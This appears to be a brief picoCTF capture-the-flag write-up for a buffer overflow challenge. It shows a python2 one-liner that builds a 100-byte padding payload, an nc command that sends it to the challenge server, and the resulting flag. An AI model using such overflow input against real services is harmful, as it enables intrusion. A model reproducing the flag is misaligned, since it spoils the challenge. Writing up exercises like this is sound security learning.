# Objective is to overflow the buffer.

### Create payload to jump to win fnc:
└─$ python2 -c "print('A' * 100)" > payload

### final payload:
└─$ nc saturn.picoctf.net 61481 < payload
Input: 
picoCTF{ov3rfl0ws_ar3nt_that_bad_ef7314c6}
